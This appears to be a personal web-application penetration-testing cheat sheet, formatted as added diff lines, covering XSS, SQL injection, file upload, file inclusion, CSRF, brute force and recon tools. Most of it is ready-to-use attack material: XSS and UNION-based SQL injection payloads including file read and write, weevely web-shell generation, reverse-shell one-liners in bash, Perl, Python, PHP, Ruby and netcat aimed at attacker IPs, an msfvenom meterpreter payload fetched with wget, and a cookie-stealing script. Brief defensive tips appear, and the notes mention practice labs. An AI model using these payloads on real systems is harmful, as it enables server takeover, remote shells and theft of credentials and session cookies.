+4.Vega vulnerability scanner	(preinstallled on kali linux)
+5.Sqlmap					
+
+
+#Main WebApp Vulnerability:
+
+1.Cross site scripting
+##Types of XSS:
+1.Persistent XSS						//malicious string originates from the website database
+2.Reflected XSS							//malicious string originates from the victim's request
+3.DOM based XSS							//vulnerability in the client side code rather than Server side code
+
+##Discovering:
+Type in the text box or the URL parameters like id=
+<script>alert(document.cookie);</script>
+
+##XSS Techniques:			https://xss-game.appspot.com	(website for practising XSS)
+1.To bypass the filtering of "<>" we can fix it by using "onmouseover=alert(document.URL)"
+
+2. < 		&lt;						>			//&gt;
+We can pass the same payload as above but if they are encoding the "" (double quotes) or single quote then we need to search for the another parameter to get it reflected
+
+3..If the <script> tag is filtered then we can use the HTML tags
+<img src="foo" onerror='alert(1)'>    						or  javascript:alert('1')
+
+4.If the image failed to load then we can change the parameter in the URL saying that
+'onerror='alert("xss")'>			after the parameter
+
+5.We can also provide a lot of XSS payloads using intruder:-
+xss payload (github)
+and then pass it to the particular parameter
+
+6.<script>document.location.href="www.twitter.com"</script>
+
+7.Whenever the encoded url comes as text then we need to pass :-
+<svg><script>alert&#401)</script>
+
+8.We can also change the input type=text to "input type=image" src onerror="alert(1)"
+
+##Security for XSS:
+>Minimize the usage of user input on html
+>escape any untrusted input from the user
+>htmlspecialchars	//special function which help in iterating through each character and then filter text and display them like a normal text
+
+
+
+
+
+
+2.SQL injection:				//We can use sqlmap for finding the vulnerability
+Imagine the code what must be happening backend and the security keeps on increasing
+Remember real escape string will try to block the execution of sql injection
+
+>order by 1		//tells about how many columns are present in the table until the error is there
+>union select	//is used for selecting the columns that we got to know from the order by command and it will be executed in the 
+				url and then do it accordingly as per the output appears like(2,3,4)
+>union select 1,2,3,4,5		//it selects the total record in the column.This is just used to select the particular table
+>customizing the command	//union 1,database(),username(),version(),5----------this depends upon the website that we are interacting with
+>union select 1,table_name,null,null,5 from information_schema.tables where table.schema='owasp10' (searching for the tables)
+>union select 1,column_name,null,null,5 from information_schema.columns where table.name='accounts'(searching for the columns)
+>union select 1,username,password,is_admin,5 from accounts (searching for the records)
+>information_schema		//table which have the information about the users and their accounts
+>UniOn selEct [number of columns] [comment]				//general select syntax
+>If the original command is not working,then to bypass the filter use the upper case or lower case of the word 
+>If space is not allowed in the url then we can use the + sign or /**/ sign
+
+
+##Working of SQL injection:
+To know the sql injection is possible try to understand the code and then try putting single quote
+Try to bypass the client validation by passing correct parameters and then changing from burp proxy
+>connect to mysql by using the syntax:-mysl -u root(username) -h [ip address]
+>select * from accounts where username='zaid' and password='123456' or 1=1#' (if we type 123456' in the textbox)(when we do not know the password)
+>Characters to use instead of spaces:+, /**/, %20
+
+
+#Different examples
+>union select 1,table_name,null,null,5 from information_schema.tables where table_schema='owasp10'
+>union select 1,column_name,null,null,5 from information_schema.columns where table_name='accounts'
+>union select 1,username,password,is_admin,5 from accounts
+>orDeR bY 1 can be re-written as:
+orDer+bY+1
+orDer/**/bY/**/1
+orDer%20bY%201
+
+#Examples of TRUE statements for discovering sql injection
+aNd 1=1
+aNd 21=21
+orDeR bY 1
+
+#Examples of FALSE statements
+dNd 0=1
+anD 9=2
+ordEr bY 1000000000000
+
+#Comments to end the quries:
+/*
+//
+#
+%23
+
+#Working Example:
+We will assume that there are 2 columns and comlumn 2 can be used to display data on screen.
+
+>Seleting database version:
+UniOn selEct 1,version() /*
+
+>Database:
+UniOn selEct 1,database() /*
+
+>Database user:
+UniOn selEct 1,user() /*
+
+>Database tables:
+UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*
+
+>Table Columns:
+UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*
+
+>Selecting data from table:
+UniOn selEct 1,[column name] frOm [table name] /*
+
+>Reading files:
+UniOn selEct 1,load_file('file location') /*
+
+>Writing files:
+UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
+
+
+#Security:-
+mysql real escape string quotation marks and quotes will be removed
+check the id is numeric or not
+
+
+#Working for Sqlmap
+sqlmap -u [link] and if we got the database "sqlmap - u [link] -D [database_name] --tables"
+
+sqlmap -r   		for the file 
+
+--dbs    			the database of mysql
+
+-D [database_name]  --tables      	find the tables in the database
+(to select anything have one dash and if we find out any query we should go for double dash)
+
+
+
+
+
+3.File Upload Vulnerability:
+It occurs when the file is uploaded,Here we can upload the file and create a meterpreter shell or a backdoor so that we can access that database
+It is executed using "weevely" which creates a file and works as a backdoor.
+
+#Security:-
+Never allow user to upload executable file
+Always validate the extension
+While uploading recreate it and rename it so that the name changes
+
+
+#Working of weevely
+Step1:-weevely generate [password] /root/shell.php(where to store)				//will generate the file
+Step2:-when file is uploaded successfully, then we need to access that file
+Step3:-After getting the path, we need to type in the terminal "weevely [path where the shell is uploaded] [password] "
+>>To upload the php shell, we can do it using burpsuite by interception of requests
+
+
+
+We need to access the whole path of the php file through web browser
+For websites to create backdoor we will use "weevely"
+weevely generate 12345 /root/Desktop/404.php							//backdoor created using password
+
+
+Listening using weevely---
+weevely http://www.site.com/404.php 12345							//backdoor created and listening
+
+shell_sh-----------execute shell commands
+file_download---------------------download the file
+file_upload-----------------------upload the file
+backdoor_reversetcp------------creatign the backdoor
+sql_console------run a sql console
+sql_dump--------dump the database
+
+
+
+
+
+
+4.Code execution vulnerability:
+Allows an attacker to execute OS commands
+Can be used to get a reverse shell
+upload any file using wget commands
+
+The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
+Therefore in all of these cases you need to listen for port 8080 using the following command
+nc -vv -l -p 8080
+
+
+>BASH
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
+
+>PERL
+perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+>Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+>PHP
+php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+>Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+>Netcat
+nc -e /bin/sh 10.20.14 8080
+
+Security:-
+>Dont' use dangerous function
+>Remove all the slashes
+>Divide the ip into array
+>check for each and every thing
+
+
+
+
+
+
+5.File Inclusion vulnerability:
+
+#Local file inclusion
+Read file on the same server
+Command provided on the URL
+Try to inject code into readable files:-like environment variables or log files
+eg---/proc/self/environ
+We need to know which parameter will have the value and so on by using burp proxy we can insert the malicious code into it.
+eg:-passthru("nc -e /bin/sh 10.14.20.204 8888") and this will execute in php
+
+var/log/auth.log				//it contains the info of all the login attempts made to server
+
+#Remote file inclusion
+Similar to local file inclusion and just the difference is that attacker can read any file from any server.Execute php file from other server on the current server.Store php file on other server such as txt
+
+
+
+
+
+
+6.CSRF(Cross site request forgery):
+Request are not validated on the server side
+Server does not check whether the user generated the request
+Request can be forged and sent to users to make them to do things they don't intend to do such as changing the passwords
+
+Security:-
+Always fill up the current password field
+Generate unique tokens for each of the web browser
+
+
+
+
+7.Cookie Manipulation:
+HTTP cookie is a small piece that is sent from the website and stored on the user's computer
+Cookies used to store data
+Enable  "Intercept responses based on following rules"		(server responses)
+Enable "convert https to http"
+Cookie manager plugin is used to edit the cookies
+
+and then we can login the form and then the request will come from the server that the cookies are being set
+and then we can use the cookie manager to edit the cookie( like uid values) and then we can refresh the page and then we can be logged as the another user
+
+Defend--
+Do not use predictable user id like 1,2,3,4 etc.
+We need to use random numbers while registering the new user
+eg--PHP rand() function
+
+
+
+
+
+
+8.HTML5 Web storage vulnerability--
+HTMl5 web storage helps you save information on the browser like cookies but faster than cookies
+But the problem is that it can be easily read and manipulated by the Man in Middle attack
+
+<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++) {var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for (i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);} catch(e) {alert(e.message);}</script><script>localStorage.setItem("SecureMessage","But.. I have already told everyone");init();</script><script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++) {var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for (i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);} catch(e) {alert(e.message);}</script>
+
+We can put this whole script in the end of the User agent field and then we can retrieve all the information i.e. stored in the HTML5 web storage
+
+Defend--
+Implement program level encryption
+Implement latest version of TLS encryption
+
+
+
+
+
+9.Brute Force and Dictionary attacks:-
+Not mainly used by hackers as this is not creative
+>cruch				//tool used to create the wordlist
+>Hydra				//bruteforce tool that can be used to bruteforce almost any authentication service
+syntax:-hydra[ip] -L[username] -P[password][service]
+Hydra Practical using burp proxy to gether variables
+
+Brute force attack---(login page)
+It can be done using "Intruder" and if there are two fields, then we can go for cluster bomb
+
+Defend--
+Implement an account lockout policy after certain no. of attempts
+Encrypt your passwords
+Do not use dictionary words/phrases
+Password policy should be "strong"
+
+
+
+
+
+#Other WebApp vulnerabilities:
+1.HTML injection attack--
+It allows the change of the webpage using html tags
+
+2.Host Header attack--
+In this we pass the value in the front of the "host" field to any random website and see that if it is being redirected to the particular website
+
+3.URL Redirection--
+EdOverflow/bug-bounty-cheatsheet		(github) 	
+Open Redirect payloads
+
+Pass them all in the intruder and see if is being redirected
+First method is to pass in front of the domain name
+Second method is to pass the whole website in the parameters like URL,redirect etc.
+
+4.CSRF-Cross Site reuqest forgery(By this we can change the password by passing the link to an account which is logged in before)
+Cross Site Request Forgery means that we are trying to change the password even when the user doesn't intend to change it. We are changing it by making a fake form page as a hidden page and when we sent that url to the user then the password automatically gets changed.
+
+
+6.Template injection:-Used to directly attack web servers, internals and obtain remote code execution
+
+7.Clickjacking is a technique that consist of deceiving a web user into interacting(in most cases by clicking) with something different to what the user belives they are interacting with. This type of attack can be used alone or in combination with other attacks could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seamingly harmless pages
+iframe tag can be used to know that is clickjacking is affected in this webpage or not
+
+8.Command Injection--here we can provide an extra commands with the normal functionaltiy by appending the commands with the normal inputs. eg:127.0.0.1 |ls
+ipconfig && dir					//first command will be executed and then the next one
+
+9.Brute force--here we can brute force the password pages by using burpsuite
+
+10.Open redirect is vulnerability that exists when a script allows redirection to an external site by directly calling a specific URL in an unfiltered,unmanaged fashion which could be used to redirect victims to unintended,malicious web sites
+
+11.FPD(Full path disclosure)----is a vulnerability that enable the attacker to see the path to the webroot file. Certain vulnerabilites such as using the load_file query to view the page source, require the attacker to have the full path to the file they wish for
+
+12.Insecure cryptographic storage is a vulnerability that occurs when sensitive data is not stored securely.Protecting sensitive data by encrypting it should be a key step in secure software development lifecycle
+
+13.Session Management--------------Manipulation of URL and the cookie should be expired just after the logout.Session should end
+
+14.Application Logic---------------The basic application bugs like design interface or authentication or information disclosure
+
+15.HTML injection:-It is a type of injection issue that occurs when  user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page
+
+16.XML External Entity--------It is a vulnerability typically found in web pages.It enables attackers to disclose normally protected files from a server or a connected network.The XML standard includes the idea of an external general parsed entity.
+
+17.Sub Domain Take Over-------------To attack the sub domains 
+#Finding and attacking subdomains
+sub domain-----------eg. www.paypal.com (domain) shopping.paypal.com(subdomain). We need to discover this and attack this
+We can use it using google dork (site:paypal.com -inurl:www)(to remove www form the site)
+www.dnsdumpster.com----------------helps to find out the dns records
+
+1.Recon-ng(type of information collection framework,and much more)
+2.netcraft(inside recon-ng) is used to find out the sub domains of the particular website
+3.sublist3r				//helps in finding out the subdomains(best to find subdomains)(github aboul3la)
+4.knockpy				//python script in github (guelfoweb) and then execute knockpy.py
+
+18.Remote file Inclusion------------File is uploaded to the server and then the backdoor is created
+
+19.Remote code execution-------------In this the file is uploaded and the module is thus executed leading to takeover of the server
+
+20.Sensitive Data Exposure------------Vulnerability occurs when the sensitive data is revealed
+
+21.Buffer Overflow---------Buffer is an amount of contiguous memory set aside for storing information. Eg:-A program has to remember certain things like what your shopping cart contains or what data was inputted prior to the current position. This information is stored in memory in a buffer.Buffer overflow when the input required exceeds the parameter thus leaking the data.
+
+22.Insecure Direct object references:-It occurs when an application provides direct access to objects based on user supplied input
+
+23.DNS Misconfiguration------------Bad Configuration of DNS settings
+
+24.DOS(Denial of Service)------------This attack was defined to make the website unavailable
+
+25.HTTP Parameter Pollution----------In this the attacker may be able to bypass input validation,trigger application errors  or modify internal variables values. This vulnerability affects a building block of all web technologies server and client side attacks exist.
+
+26.User agent Manipulation/spoofing
+Website uses code to detect the browser version and OS to adjsut page accordingly
+This can be spoofed using User agent switcher
+>Defend-
+Configure web server to disable Directory indexing
+No doctype declaration should be there but still if u need it, then disallow the external entities
+Do not go for major functions like security,configuration based on user agent manipulation
+
+27.Hidden URLs or Secret Urls
+There are urls that the admin secretly maintains to get access to website configuration.
+These can be get using intruder 
+>Defend--
+access-role for users who can access the file system
+Setting file level encryption so that file will be decrypted only for the particular user
+
+
+
+#Reporting a vulnerability--
+>Exclusions should not be reported 
+>Description
+>Bug
+>Steps to Reproduce
+
+
+#Working of Burpsuite
+>detailed tool explanation of this web application security(http://burp---for certificate)
+>proxy is used to work as a middle man to intercept the request
+>Spider is used to work as a web crawler which helps in finding out the pages (robots.txt is a file which is present in websites and used to tell web browsers that do not display these pages in the search results)
+enable spider running and the output will be displayed on the target window(It will crawl for each and every page that is available)
+>Scanner in burpsuite will check for the vulnerabilities in the web page that we are surfing upon
+>Intruder is a feature that helps in the brute forcing and trying the no. of parameters in a fraction of seconds.When we login in the website then the request will be generated in the HTTP history and then we need to send it to the intruder and then add the list and start attack
+>Repeater feature is used to test the script for the response by making changes in the code and then proceed to go(check for xss and sql)
+>Sequencer feature helps in the analyzing of the cookies for their reliability. Tokens are produced to test whether they are strong or weak
+>Decoder helps to encode and decode the text 
+>Comparer helps to compare two links (Requests)
+>save and restore helps to save the traffic captured
+>To work with the https pages we need to import a burpsuite certificate
+
+
+#Webapp vulnerability practise
+1.bwapp					//it is a buggy web application that helps in practise of vulnerabilities
+2.DVWA
+
+#Other Tools
+1.wappalyzer				//It uncovers the technologies used on websites(add on)
+2.Hackbar					//helps in testing of SQL injections(add one)
+3.User agent switcher		//helps in adjusting according to the user requirements
+
+
+#Wordpress hacking
+wpscan --url[url name]
+CMSmap-----------------tool used to find security flaws inside the CMS 
+
+
+
+#Methodology/Steps to find out the bug
+>Prepare the report 
+>check for the URL and the affected parameters
+>description fo the browser or the OS
+>Proof of concept
+>steps to reproduce again
+>Take Screenshot
+
+
+
+#BEEF Framework:-
+Run any javascript code
+Targets can be hooked to beef using javascript code
+Browser exploitation framework allowing us to launch a no. of attacks on a hooked target
+Inject beef hook on vulnerable pages
+Execute commands from beef
+>>Understanding of BEEF				//like raw javascript,alert,syder eye,redirect browser,fake login pages etc.
+
+
+
+
+#Working of Veil Framework
+evasion-----that generates undetectable backdoor
+ordnance----that creates payload used by evasion
+Reverse-----the victim computer connecting to attacker computer thus bypassing antivirus and firewall
+
+Generate the backdoor using veil framework and scan for the particular file
+To listen for the incoming connections:-use exploit/multi/handler
+
+
+#Different platforms of bug bounty
+hackerone
+bugcrowd
+openbugbounty
+
+
+
+11. Website Application Penetration Testing
+>HTTP Request and HTTP Response
+
+11.1 Information Gathering and Dirb Tool
+dirb http://192.168.1.8							//will enumerate through the website according to its inbuilt dictionary
+
+11.2 Burpsuite Configuration
+>Install Burp CA Certificate in web browser
+
+
+
+**Netcat creating port to send data
+nc -e /bin/bash 192.168.1.9 12345 
+
+**Netcat listening port (on 192.168.1.9)
+nc -lvp 12345
+
+
+**Creating python file containing msfvenom payload
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=6000 >> tester.py
+
+**Start Apache2 Web Server
+sudo service apache2 start
+
+**To download file from internet  (using wget)
+wget 192.168.1.9/tester.py
+
+
+11.3 CSRF
+It forces user to do that thing that we want
+Copying the form tag and putting down the value and action to the original page where password needs to be changed and thus password will get changed
+
+
+11.4 Brute Force attack
+Hydra tool
+hydra 192.168.1.8 http-form-port "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -L usernames.txt -P passwords.txt
+
+For every website it will be different
+
+also brute force attack can also be done using Burpsuite
+
+
+
+
+************************************************************************************************
+#Extra
+To extract the package of "deb" we can extract using terminal using dpkg -i [file_name]
+If we got a vulnerability then we can exploit it using metasploit and take over the computer having vulnerability.
+To bruteforce the webpages we should use "burpsuite" on the required parameter to find out the value
+cookie stealer--<script>windows.location='https://localhost/steal.php?cookie' +escape(document.cookie)</script>
+https://nodistribute.com/		//website that helps to scan the payload
+Cookies are present in the browser under privacy
+crt.sh-------------helps to know about the certificate the website is using
+OSINT---------framework focused on gathering information from free tools or resources.
+>>>>>>>>>>>cd /opt------------here we should download optional software
+>>>>>>>>>>./setup.sh------------for all the bash files setup
+--silent(parameter)-------------silently installs the default package
+Cookie manager+ 		-------------ad on for firefox and helps them to edit cookies (modifying cookies)
+Zed attack proxy (ZAP)				//Automatic Process of finding out vulnerability
+wget				//used in kali linx to download the file
+
+#ends
